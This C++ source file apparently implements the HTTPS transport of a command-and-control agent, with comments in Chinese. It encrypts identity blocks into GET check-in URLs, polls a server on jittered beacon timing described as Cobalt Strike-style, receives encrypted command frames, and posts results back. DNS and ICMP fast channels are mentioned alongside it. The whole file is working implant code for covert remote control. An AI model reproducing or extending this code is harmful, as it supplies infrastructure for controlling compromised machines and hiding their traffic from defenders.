// HttpsTransport.cpp
#include "HttpsTransport.hpp"

#include "Core/Config/AgentConfig.hpp"
#include "Core/Identity/SessionIdentity.hpp"
#include "Crypto/Engine/CryptoManager.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/ThirdParty/json.hpp"

#include <algorithm>
#include <cstdio>
#include <ctime>
#include <random>
#include <utility>

namespace cleat {

	namespace {
		constexpr int kGetDecryptFailThreshold = 3;
		/// GET 快速档周期(毫秒), 与 DNS/ICMP 的 fast 档同义(节拍合一 A1.3)
		constexpr uint32_t kFastGetIntervalMs = 1000;

		/// base32url 无填充编码(小写 RFC4648; 与服务端 S1 解码器锁步, 查询参数安全)
		std::string Base32UrlEncode(const std::vector<uint8_t>& in) {
			static const char* kAlpha = "abcdefghijklmnopqrstuvwxyz234567";
			std::string out;
			out.reserve((in.size() * 8 + 4) / 5);
			uint32_t bits = 0;
			int nbits = 0;
			for (const uint8_t b : in) {
				bits = (bits << 8) | b;
				nbits += 8;
				while (nbits >= 5) {
					nbits -= 5;
					out += kAlpha[(bits >> nbits) & 0x1f];
				}
			}
			if (nbits > 0) out += kAlpha[(bits << (5 - nbits)) & 0x1f];
			return out;
		}

		/// 16 字节随机数 → 32 字符 hex(身份块防重放 nonce)
		std::string Nonce32Hex() {
			static std::mt19937_64 rng{ std::random_device{}() };
			const uint64_t a = rng();
			const uint64_t b = rng();
			char buf[33];
			std::snprintf(buf, sizeof(buf), "%016llx%016llx",
				static_cast<unsigned long long>(a), static_cast<unsigned long long>(b));
			return std::string(buf, 32);
		}
	} // namespace

	HttpsTransport::HttpsTransport(std::unique_ptr<IHttpOps> http)
		: http_(std::move(http)), get_clock_(get_policy_, kFastGetIntervalMs) {
	}

	HttpsTransport::~HttpsTransport() {
		Disconnect();
	}

	bool HttpsTransport::Connect(const TransportConfig& cfg) {
		std::lock_guard<std::mutex> lock(mutex_);
		cfg_ = cfg;
		if (!http_) {
			CLEAT_LOGE(ErrDom::Net, ErrCode::NotSupported, "HttpsTransport: 本平台未实现 HTTPS 通道(工厂返回空)");
			return false;
		}

		// 探活: 一次 GET(200 空 body 即视为可达); 探活响应带数据也入 pending_
		std::vector<uint8_t> probe;
		const GetResult r = do_get(probe);
		// 探活即本条链路的首次 check-in: 节拍自这里起算(档位判定与 Recv 同源 ——
		// 未注册(sid=0)走快速档, 否则按空闲档固化下一拍)
		get_clock_.Reschedule(SessionIdentity::Instance().GetSessionId() == 0, false);
		const bool ok = (r != GetResult::Failed);
		connected_.store(ok);
		if (r == GetResult::Frame && !probe.empty()) {
			// (与 POST 响应同语义)。旧实现把 probe 丢在局部变量里 —— 通道热切换/
			// 重连后的首帧会静默丢弃(与上方注释"探活响应带数据也入 pending_"不符)。
			EnqueuePending(std::move(probe));
		}
		if (!ok) {
			LOG_WARN("HttpsTransport: Connect 探活失败 url=" << cfg_.url);
			http_->Reset();
		}
		else {
			LOG_INFO("HttpsTransport: 探活成功 url=" << cfg_.url);
		}
		return ok;
	}

	void HttpsTransport::Disconnect() {
		connected_.store(false);
		std::lock_guard<std::mutex> lock(mutex_);
		if (http_) {
			http_->Reset();   // 释放连接池, 供下次 Connect 重建
		}
		// 原实现只清 connected_/连接池, 把这三项留给 Reset(); 而 Reset() 仅在
		// "连接失败"与"回探成功后处理旧通道"两处被调用, **正常重连路径不调用** →
		// 旧链路残留的 pending_ 帧会在新会话确认之前被 Recv 优先交付(陈旧命令重复
		// 派发; 叠加确认帧不校验归属, 陈旧确认帧还能满足 8s 确认等待 = 假成功)。
		pending_.clear();              // 待交付的下行帧
		get_clock_.Reset();            // check-in 节拍(未武装态: 下次 ShouldRun 立即放行)
		uploaded_since_last_get_ = false;
		get_decrypt_fail_streak_ = 0;  // 解密失败熔断计数(D8)
		ClearDegraded();  // 解密失败熔断计数(D8)
	}

	ChannelHealth HttpsTransport::HealthNow() const {
	if (!connected_.load()) return ChannelHealth::Dead;
	return degraded_.load() ? ChannelHealth::Degraded : ChannelHealth::Healthy;
	}

	void HttpsTransport::MarkDegraded(const char* why) {
	if (!degraded_.exchange(true)) {
		LOG_DEBUG("HttpsTransport: Health=Degraded (" << why << ")");
	}
	}

	bool HttpsTransport::IsConnected() const {
		return connected_.load();
	}

	bool HttpsTransport::Send(const std::vector<uint8_t>& frame) {
		if (!connected_.load()) {
			return false;
		}
		std::lock_guard<std::mutex> lock(mutex_);
		const bool ok = do_post(frame);
		if (!ok) {
			connected_.store(false);   // 通知上层重连
		}
		else {
			// interact 快速往返(A2): POST 完成即触发下一拍 GET, 不等节拍 ——
			// 注册确认/命令结果的响应端到端时延从"一个心跳周期"降到毫秒级。
			// 只可能提前(ArmNow 不重抽间隔), 与快速档叠加仍无界风险。
			uploaded_since_last_get_ = true;
			get_clock_.ArmNow();
		}
		return ok;
	}

	bool HttpsTransport::Recv(std::vector<uint8_t>& frame, int /*timeout_ms*/) {
		if (!connected_.load()) {
			return false;
		}
		std::lock_guard<std::mutex> lock(mutex_);

		// 优先消费 POST 响应(注册确认/捎带命令): 毫秒级交付, 不依赖 GET 节流
		if (!pending_.empty()) {
			frame = std::move(pending_.front());
			pending_.pop_front();
			return true;
		}

		// GET 节流: 统一节拍对象 PollClock(节拍合一 A1) —— 唯一抖动模型 HeartbeatPolicy
		// (正态/均匀 + 丢拍, SetConfig 下发即时生效), fast/active/空闲三档:
		//   fast   = 未注册(sid=0) → 1s(与 DNS/ICMP fast 档同义)
		//   active = 自上次 GET 以来有成功 POST → active_interval_ms 收紧
		//   空闲   = base ± 抖动 + 丢拍(skip_beat, 对齐 CS sleep 丢拍语义)
		const bool fast = SessionIdentity::Instance().GetSessionId() == 0;
		if (!get_clock_.ShouldRun(fast, uploaded_since_last_get_)) {
			return false;
		}
		uploaded_since_last_get_ = false;

		const GetResult r = do_get(frame);
		if (r == GetResult::Failed) {
			connected_.store(false);   // 通知上层重连
		}
		else {
			// 观测: check-in 节拍可见性(心跳成功同样有日志, 否则日志里只剩
			// "丢拍"一种事件, 观感即"全部被跳过")
			LOG_INFO("HttpsTransport: GET check-in ok ("
				<< (r == GetResult::Frame ? frame.size() : 0) << "B)");
		}
		return r == GetResult::Frame;
	}

	void HttpsTransport::Reset() {
		//  与 Disconnect 同义 —— 清理路径只保留一条(Disconnect 承担全部作废)。
		// 保留本方法以满足 ITransport 契约, 但**不再有第二套清理逻辑**, 避免
		// "只在失败路径清理、正常重连漏清"这类不对称( 的成因)。
		Disconnect();
	}

	void HttpsTransport::EnqueuePending(std::vector<uint8_t> frame) {
		// 队列无限增长风险: 上层高频消费(10ms)是常态, 但主循环被回探/降级阻塞时
		// 消费会停滞 —— 无上限则 POST 捎带帧可无界累积。超限丢最旧并 WARN, 保证
		// 内存有界(丢的是错失时机的陈旧响应, 与 Disconnect 作废旧帧同语义)。
		if (pending_.size() >= kPendingMaxFrames) {
			LOG_WARN("HttpsTransport: pending_ 达上限 " << kPendingMaxFrames
				<< ", 丢弃最旧捎带帧(上层消费停滞?)");
			pending_.pop_front();
		}
		pending_.push_back(std::move(frame));
	}

	bool HttpsTransport::do_post(const std::vector<uint8_t>& frame) {
		// 明文帧 -> Encrypt(frame) 作为 body(与 TCP 的 [4B][Encrypt] 不同, 无帧头)
		std::vector<uint8_t> body = frame;
		if (CryptoManager::Instance().IsEnabled()) {
			std::vector<uint8_t> enc;
			if (!CryptoManager::Instance().Encrypt(frame, enc)) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "HttpsTransport: POST 加密失败 (len=" << frame.size() << ")");
				return false;
			}
			body = std::move(enc);
		}

		const std::string& post_url = cfg_.upload_url.empty() ? cfg_.url : cfg_.upload_url;
		std::vector<uint8_t> response;
		const bool ok = http_->RoundTrip(HttpMethod::Post, post_url, body, response,
			static_cast<int>(cfg_.timeout_ms));
		if (!ok) {
			LOG_WARN("HtsTransport: POST 失败 url=" << post_url);
			return false;
		}

		// CS 式: 上传响应可捎带服务器帧(注册确认/命令), 缓存待上层消费。
		// 多帧入队(L2): Send(命令线程)与 Recv(主循环)并发时不再覆盖丢帧;
		// 队列以 kPendingMaxFrames 为硬上限(见 EnqueuePending), 超限丢最旧。
		if (!response.empty()) {
			if (CryptoManager::Instance().IsEnabled()) {
				std::vector<uint8_t> dec;
				if (CryptoManager::Instance().Decrypt(response, dec)) {
					EnqueuePending(std::move(dec));
				}
				else {
					MarkDegraded("H7 post_response_decrypt_fail");
					LOG_WARN("HttpsTransport: POST 响应解密失败, 丢弃 (len="
						<< response.size() << ")");
				}
			}
			else {
				EnqueuePending(std::move(response));
			}
		}
		return true;
	}

	/// 构造 GET 取件 URL(节拍合一 A1.2): 有 mid/sid 时带 ?m=<base32url(身份块密文)>。
	/// 身份块明文 = {"sid":N} 或 {"mid":"..."}, 另加 ts(unix 秒) + nonce(16B hex),
	/// 密文与 POST body 同套(CryptoManager::Encrypt); 服务端按"解密成功"认证身份。
	/// 首启(无 mid 无 sid)返回裸 url —— 服务端探活护栏 200 空, Agent 随后走 POST 注册;
	/// 若强行带空身份会被服务端 400 拒绝, 反而触发无谓重连。
	std::string HttpsTransport::BuildGetUrl() {
		const uint64_t sid = SessionIdentity::Instance().GetSessionId();
		const std::string mid = SessionIdentity::Instance().GetMachineId();
		nlohmann::json j;
		if (sid > 0) {
			j["sid"] = sid;
		}
		else if (!mid.empty()) {
			j["mid"] = mid;
		}
		else {
			return cfg_.url;   // 首启: 探活护栏形态
		}
		j["ts"] = static_cast<int64_t>(std::time(nullptr));
		j["nonce"] = Nonce32Hex();
		std::string plain = j.dump();
		std::vector<uint8_t> ct;
		if (CryptoManager::Instance().IsEnabled()) {
			if (!CryptoManager::Instance().Encrypt(
				std::vector<uint8_t>(plain.begin(), plain.end()), ct)) {
				// 探活护栏处理(200 空不派发), 本拍取件静默丢失且违背身份块两态契约。
				LOG_WARN("HttpsTransport: 身份块加密失败, 本拍放弃取件(触发重连)");
				return std::string();
			}
		}
		else {
			ct.assign(plain.begin(), plain.end());
		}
		return cfg_.url + "?m=" + Base32UrlEncode(ct);
	}

	HttpsTransport::GetResult HttpsTransport::do_get(std::vector<uint8_t>& frame) {
		const std::string url = BuildGetUrl();
		if (url.empty()) {
			// 身份块加密失败(BuildGetUrl 约定空串 = 本拍失败): 断链重连重新握手
			return GetResult::Failed;
		}
		std::vector<uint8_t> response;
		if (!http_->RoundTrip(HttpMethod::Get, url, {}, response,
			static_cast<int>(cfg_.timeout_ms))) {
			LOG_WARN("HttpsTransport: GET 失败 url=" << url.substr(0, url.find('?'))
				<< " (query 已脱敏)");
			return GetResult::Failed;
		}
		if (response.empty()) {
			return GetResult::Empty;   // 200 空 body: 无命令, 非错误
		}

		// 响应体 = Encrypt(命令帧) 或明文(加密关闭时)
		if (CryptoManager::Instance().IsEnabled()) {
			std::vector<uint8_t> dec;
			if (!CryptoManager::Instance().Decrypt(response, dec)) {
				// 换钥/重启导致密钥不匹配时, 旧行为使 agent 永久"在线但收不到
				// 命令"(与第五轮"注册后静默"同源)。连续失败到阈值即判链路不可用,
				// 交上层重连重新握手(TCP 侧  熔断同语义)。
				if (++get_decrypt_fail_streak_ >= kGetDecryptFailThreshold) {
					CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "HttpsTransport: GET 响应连续 " << get_decrypt_fail_streak_
						<< " 次解密失败(key_id/密钥不匹配?), 判定链路不可用, 强制重连");
					return GetResult::Failed;
				}
				MarkDegraded("H4 get_decrypt_fail");
				LOG_WARN("HttpsTransport: GET 响应解密失败 (len=" << response.size()
					<< ", streak=" << get_decrypt_fail_streak_ << ")");
				return GetResult::Empty;
			}
			get_decrypt_fail_streak_ = 0;   // 仅解密成功视为密钥匹配(空 body 证据不足)
			frame = std::move(dec);
		}
		else {
			frame = std::move(response);
		}
		return GetResult::Frame;
	}

	std::unique_ptr<ITransport> CreateHttpsTransport() {
		return std::make_unique<HttpsTransport>(CreateHttpOps());
	}

} // namespace cleat
